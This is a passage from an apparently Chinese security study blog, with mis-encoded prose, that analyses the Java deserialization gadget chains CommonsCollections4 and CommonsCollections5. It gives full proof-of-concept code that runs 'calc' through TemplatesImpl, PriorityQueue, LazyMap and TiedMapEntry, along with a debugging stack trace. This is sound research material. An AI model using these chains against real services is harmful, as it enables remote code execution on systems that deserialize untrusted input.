<h4 id="å…³é”®ç±»-3"><a href="#å…³é”®ç±»-3" class="headerlink" title="å…³é”®ç±»"></a>å…³é”®ç±»</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs awk">TrAXFilter<br>Templates<br>TemplatesImpl<br>InstantiateTransformer <span class="hljs-regexp">//</span>æ›¿æ¢InvokerTransformer<br><br>ClassPool<br>CtClass<br>AbstractTranslet<br><br>Transformer<br>ConstantTransformer<br>ChainedTransformer<br><br>HashMap<br>LazyMap<br><br>AnnotationInvocationHandler<br>Proxy<br></code></pre></td></tr></table></figure>

<p>CC4 æ˜¯ CC2+CC3 çš„å˜ä½“ï¼Œby the wayï¼Œseebug é‡Œé¢çš„ poc æˆ‘æ„Ÿè§‰æ˜¯è´´é”™äº† CC2 çš„</p>
<p>åœ¨ CC2 çš„åˆ©ç”¨èƒŒæ™¯ä¸‹ï¼Œæ”¹è¿› PriorityQueue åˆ©ç”¨é“¾ï¼šå› ä¸º CommonsCollections4 é™¤ 4.0 çš„å…¶ä»–ç‰ˆæœ¬å»æ‰äº† <code>InvokerTransformer</code>çš„ Serializable ç»§æ‰¿ï¼Œå¯¼è‡´æ— æ³•åºåˆ—åŒ–æ‰€ä»¥ä¾¿æœ‰äº† CC4ï¼ŒCC4 åªæ˜¯å°† CC2 ä¸­çš„ <code>InvokerTransformer</code>æ›¿æ¢ä¸ºäº†<code>InstantiateTransformer</code></p>
<h3 id="Gadget-3"><a href="#Gadget-3" class="headerlink" title="Gadget"></a>Gadget</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC4;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC4</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object o, String fieldName, Object value)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class clz = o.getClass();<br>            Field declaredFiled = clz.getDeclaredField(fieldName);<br>            declaredFiled.setAccessible(<span class="hljs-keyword">true</span>);<br>            declaredFiled.set(o, value);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        ClassPool cp = ClassPool.getDefault();<br>        cp.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass ctc = cp.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);<br>        ctc.setSuperclass(cp.get(AbstractTranslet.class.getName()));<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        ctc.makeClassInitializer().insertBefore(cmd);<br><br>        <span class="hljs-keyword">byte</span>[] classbytes = ctc.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetclassbytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;classbytes&#125;;<br>        TemplatesImpl templatesimpl = <span class="hljs-keyword">new</span> TemplatesImpl();<br><br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetclassbytes);<br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;templatesimpl&#125;),<br>        &#125;);<br><br>        TransformingComparator transformingComparator = <span class="hljs-keyword">new</span> TransformingComparator(chainedTransformer);<br>        PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue();<br><span class="hljs-comment">//        PriorityQueue queue = new PriorityQueue(2,transformingComparator);</span><br>        setFieldValue(queue,<span class="hljs-string">&quot;size&quot;</span>,<span class="hljs-number">2</span>);<br>        setFieldValue(queue,<span class="hljs-string">&quot;comparator&quot;</span>,transformingComparator);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(queue);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è¿™é‡Œå‘ç°<code>new PriorityQueue(1)</code>åå†åå°„è®¾ç½®äº†<code>size=2</code>ï¼Œå´å¹¶æ²¡æœ‰è§¦å‘ï¼Œæœ‰å¦‚ä¸‹æŠ¥é”™</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Exception <span class="hljs-keyword">in</span> thread <span class="hljs-string">&quot;main&quot;</span> java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.ArrayIndexOutOfBoundsException</span>: <span class="hljs-number">1</span><br>	at java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.PriorityQueue</span><span class="hljs-selector-class">.writeObject</span>(PriorityQueue<span class="hljs-selector-class">.java</span>:<span class="hljs-number">770</span>)<br>	at sun<span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.NativeMethodAccessorImpl</span><span class="hljs-selector-class">.invoke0</span>(Native Method)<br>	at sun<span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.NativeMethodAccessorImpl</span><span class="hljs-selector-class">.invoke</span>(NativeMethodAccessorImpl<span class="hljs-selector-class">.java</span>:<span class="hljs-number">62</span>)<br>	at sun<span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.DelegatingMethodAccessorImpl</span><span class="hljs-selector-class">.invoke</span>(DelegatingMethodAccessorImpl<span class="hljs-selector-class">.java</span>:<span class="hljs-number">43</span>)<br>	at java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.Method</span><span class="hljs-selector-class">.invoke</span>(Method<span class="hljs-selector-class">.java</span>:<span class="hljs-number">497</span>)<br>	at java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.ObjectStreamClass</span><span class="hljs-selector-class">.invokeWriteObject</span>(ObjectStreamClass<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1028</span>)<br>	at java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.ObjectOutputStream</span><span class="hljs-selector-class">.writeSerialData</span>(ObjectOutputStream<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1496</span>)<br>	at java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.ObjectOutputStream</span><span class="hljs-selector-class">.writeOrdinaryObject</span>(ObjectOutputStream<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1432</span>)<br>	at java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.ObjectOutputStream</span><span class="hljs-selector-class">.writeObject0</span>(ObjectOutputStream<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1178</span>)<br>	at java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.ObjectOutputStream</span><span class="hljs-selector-class">.writeObject</span>(ObjectOutputStream<span class="hljs-selector-class">.java</span>:<span class="hljs-number">348</span>)<br>	at CommonsCollections<span class="hljs-selector-class">.CC4</span><span class="hljs-selector-class">.CC4</span><span class="hljs-selector-class">.main</span>(CC4<span class="hljs-selector-class">.java</span>:<span class="hljs-number">64</span>)<br></code></pre></td></tr></table></figure>

<p>ä½†åœ¨ CC2 ä¸­æåˆ°</p>
<blockquote>
<p>PriorityQueue æ„é€ æ–¹æ³•ä¸ºä»€ä¹ˆä¼ å…¥(1)ï¼Œä¹Ÿå¯ä»¥ä¼ å…¥(1,transformingComparator)å add ä¸¤æ¬¡ï¼Œæˆ–è€…åå°„ä¸ä¼ å…¥å‚æ•°éƒ½å¯ä»¥è§¦å‘</p>
</blockquote>
<p>æˆ‘ä»¬æ³¨æ„åˆ° CC2 ä¸­</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java">        PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">1</span>);<br>        Object[] queue_array =<span class="hljs-keyword">new</span> Object[] &#123;templatesimpl, <span class="hljs-number">1</span>&#125;;<br><br>        setFieldValue(queue,<span class="hljs-string">&quot;queue&quot;</span>,queue_array);<br>        setFieldValue(queue,<span class="hljs-string">&quot;size&quot;</span>,<span class="hljs-number">2</span>);<br>--------------------------------------------------------------------------------------------------------<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">PriorityQueue</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>(DEFAULT_INITIAL_CAPACITY, <span class="hljs-keyword">null</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">PriorityQueue</span><span class="hljs-params">(<span class="hljs-keyword">int</span> initialCapacity)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>(initialCapacity, <span class="hljs-keyword">null</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">PriorityQueue</span><span class="hljs-params">(<span class="hljs-keyword">int</span> initialCapacity,</span></span><br><span class="hljs-params"><span class="hljs-function">                         Comparator&lt;? <span class="hljs-keyword">super</span> E&gt; comparator)</span> </span>&#123;<br>        <span class="hljs-comment">// Note: This restriction of at least one is not actually needed,</span><br>        <span class="hljs-comment">// but continues for 1.5 compatibility</span><br>        <span class="hljs-keyword">if</span> (initialCapacity &lt; <span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException();<br>        <span class="hljs-keyword">this</span>.queue = <span class="hljs-keyword">new</span> Object[initialCapacity];<br>        <span class="hljs-keyword">this</span>.comparator = comparator;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">writeObject</span><span class="hljs-params">(java.io.ObjectOutputStream s)</span></span><br><span class="hljs-function">        <span class="hljs-keyword">throws</span> java.io.IOException </span>&#123;<br>        <span class="hljs-comment">// Write out element count, and any hidden stuff</span><br>        s.defaultWriteObject();<br><br>        <span class="hljs-comment">// Write out array length, for compatibility with 1.5 version</span><br>        s.writeInt(Math.max(<span class="hljs-number">2</span>, size + <span class="hljs-number">1</span>));<br><br>        <span class="hljs-comment">// Write out all elements in the &quot;proper order&quot;.</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; size; i++)<br>            s.writeObject(queue[i]);<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>æ˜¯ç­‰ä»·äºç›´æ¥<code>new PriorityQueue(2)</code>çš„ï¼Œ<code>PriorityQueue.queue[2]</code>ï¼Œåºåˆ—åŒ–æ—¶æ˜¯ä¸ä¼šæŠ¥æ•°ç»„è¶Šç•Œçš„</p>
<p>CC4 è¿™é‡Œ<code>initialCapacity</code>è®¾ç½® 1ï¼Œå´æ²¡æœ‰åå°„ä¿®æ”¹<code>queue[]</code>ï¼Œäºæ˜¯åœ¨<code>PriorityQueue.writeObject</code>å‡ºç°æ•°ç»„è¶Šç•Œ(ä¸ºä»€ä¹ˆé€šè¿‡åå°„ä¿®æ”¹<code>size</code>åœ¨ CC2 ä¸­æœ‰è¯´æ˜)ï¼Œä¸è°ƒè¯•äº†ï¼Œç›´æ¥åå°„æ”¹ queue æ•°ç»„çœ‹çœ‹</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">      PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">1</span>);<br>setFieldValue(queue,<span class="hljs-string">&quot;queue&quot;</span>,<span class="hljs-keyword">new</span> Object[<span class="hljs-number">2</span>]);<br></code></pre></td></tr></table></figure>

<p>éªŒè¯æˆåŠŸ</p>
<h2 id="CommonsCollections5"><a href="#CommonsCollections5" class="headerlink" title="CommonsCollections5"></a>CommonsCollections5</h2><h3 id="Pre-4"><a href="#Pre-4" class="headerlink" title="Pre"></a>Pre</h3><h4 id="é™åˆ¶-4"><a href="#é™åˆ¶-4" class="headerlink" title="é™åˆ¶"></a>é™åˆ¶</h4><blockquote>
<p>jdk æš‚æ— é™åˆ¶</p>
<p>CommonsCollections 3.1 - 3.2.1</p>
</blockquote>
<h4 id="åˆ©ç”¨é“¾-4"><a href="#åˆ©ç”¨é“¾-4" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">BadAttributeValueExpException</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>              <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span><br>                  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br>                      <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                              <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                                  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span>get<span class="hljs-constructor">Method()</span><br>                          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                              <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                                  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span><br>                          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                              <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                                  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure>

<h4 id="å…³é”®ç±»-4"><a href="#å…³é”®ç±»-4" class="headerlink" title="å…³é”®ç±»"></a>å…³é”®ç±»</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">TiedMapEntry</span><br><span class="hljs-attribute">BadAttributeValueExpException</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">Transformer</span><br><span class="hljs-attribute">ConstantTransformer</span><br><span class="hljs-attribute">InvokerTransformer</span><br><span class="hljs-attribute">ChainedTransformer</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">HashMap</span><br><span class="hljs-attribute">LazyMap</span><br></code></pre></td></tr></table></figure>

<h4 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h4><p>CC5 æ˜¯æ”¹é€ äº† CC1ï¼ŒCC1 ä¸­<code>LazyMap.get</code>æ‰¾ä¸åˆ°å€¼è°ƒç”¨<code>transform</code>æ–¹æ³•ä»è€Œ RCEï¼›CC5 ç”¨äº†<code>TiedMapEntry.toString</code>æ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TiedMapEntry</span><span class="hljs-params">(Map map, Object key)</span> </span>&#123;<br>       <span class="hljs-keyword">super</span>();<br>       <span class="hljs-keyword">this</span>.map = map;<br>       <span class="hljs-keyword">this</span>.key = key;<br>   &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>&#123;<br>       <span class="hljs-keyword">return</span> getKey() + <span class="hljs-string">&quot;=&quot;</span> + getValue();<br>   &#125;<br><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">getValue</span><span class="hljs-params">()</span> </span>&#123;<br>       <span class="hljs-keyword">return</span> map.get(key);<br>   &#125;<br></code></pre></td></tr></table></figure>

<p>å¯è§<code>map key</code>å‡å¯æ§ï¼Œæ‰€ä»¥æ­¤å¤„è®¾ç½® map ä¸º CC1 ä¸­çš„<code>LazyMap</code>å°±èƒ½ RCE äº†</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC5;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC5</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;);<br><br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm, chainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate, <span class="hljs-number">1</span>);<br>        tiedMapEntry.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="BadAttributeValueExpException"><a href="#BadAttributeValueExpException" class="headerlink" title="BadAttributeValueExpException"></a>BadAttributeValueExpException</h4><p>å¦‚ä½•å»è°ƒç”¨<code>TiedMapEntry.toString</code>å¹¶ä¸”åºåˆ—åŒ–å‘¢ï¼Œä¸ºäº†ä¸å— jdk ç‰ˆæœ¬é™åˆ¶ï¼ŒCC5 ä½¿ç”¨äº†<code>BadAttributeValueExpException</code>ç±»</p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/190468#h3-3">https://www.anquanke.com/post/id/190468#h3-3</a></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">BadAttributeValueExpException</span> <span class="hljs-params">(Object val)</span> </span>&#123;<br>    <span class="hljs-keyword">this</span>.val = val == <span class="hljs-keyword">null</span> ? <span class="hljs-keyword">null</span> : val.toString();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>    ObjectInputStream.GetField gf = ois.readFields();<br>    Object valObj = gf.get(<span class="hljs-string">&quot;val&quot;</span>, <span class="hljs-keyword">null</span>);<br><br>    <span class="hljs-keyword">if</span> (valObj == <span class="hljs-keyword">null</span>) &#123;<br>        val = <span class="hljs-keyword">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (valObj <span class="hljs-keyword">instanceof</span> String) &#123;<br>        val= valObj;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (System.getSecurityManager() == <span class="hljs-keyword">null</span><br>            || valObj <span class="hljs-keyword">instanceof</span> Long<br>            || valObj <span class="hljs-keyword">instanceof</span> Integer<br>            || valObj <span class="hljs-keyword">instanceof</span> Float<br>            || valObj <span class="hljs-keyword">instanceof</span> Double<br>            || valObj <span class="hljs-keyword">instanceof</span> Byte<br>            || valObj <span class="hljs-keyword">instanceof</span> Short<br>            || valObj <span class="hljs-keyword">instanceof</span> Boolean) &#123;<br>        val = valObj.toString();<br>    &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// the serialized object is from a version without JDK-8019292 fix</span><br>        val = System.identityHashCode(valObj) + <span class="hljs-string">&quot;@&quot;</span> + valObj.getClass().getName();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ç›´æ¥æ„é€ çš„è¯ä¼šç›´æ¥è§¦å‘</p>
